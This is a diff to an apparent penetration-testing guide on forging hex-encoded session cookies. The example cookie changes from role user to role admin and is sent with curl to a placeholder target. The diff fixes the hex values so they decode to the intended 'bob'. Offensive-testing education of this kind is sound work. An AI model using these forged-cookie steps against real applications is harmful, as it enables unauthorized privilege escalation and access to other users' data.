@@ -25,10 +25,10 @@ Cookie: SESSIONID=757365723A626F623B726F6C653A75736572
         ↓ modify
         user:bob;role:admin
         ↓ re-encode (same format)
-        757365723A6874623B726F6C653A61646D696E
+        757365723A626F623B726F6C653A61646D696E
 
 # Send modified cookie
-Cookie: SESSIONID=757365723A6874623B726F6C653A61646D696E
+Cookie: SESSIONID=757365723A626F623B726F6C653A61646D696E
 ```
 
 Success indicator: the application treats the request as having the modified identity/role - admin pages load, other users' data appears, restricted actions succeed.
@@ -203,13 +203,13 @@ Modify the relevant field, re-encode using the exact same chain in reverse:
 # Original: user:bob;role:user → 757365723A626F623B726F6C653A75736572
 # Modified: user:bob;role:admin
 echo -n 'user:bob;role:admin' | xxd -p | tr -d '\n'
-# → 757365723A6874623B726F6C653A61646D696E
+# → 757365723A626F623B726F6C653A61646D696E
 ```
 
 Send the modified cookie:
 
 ```bash
-curl -s -b 'SESSIONID=757365723A6874623B726F6C653A61646D696E' https://<TARGET>/dashboard | grep -iE 'admin|welcome'
+curl -s -b 'SESSIONID=757365723A626F623B726F6C653A61646D696E' https://<TARGET>/dashboard | grep -iE 'admin|welcome'
 ```
 
 If the response shows admin functionality, the tamper worked. If the response is a login redirect or "session invalid" error, the cookie has a signature you broke (move to the encrypted/signed section below).
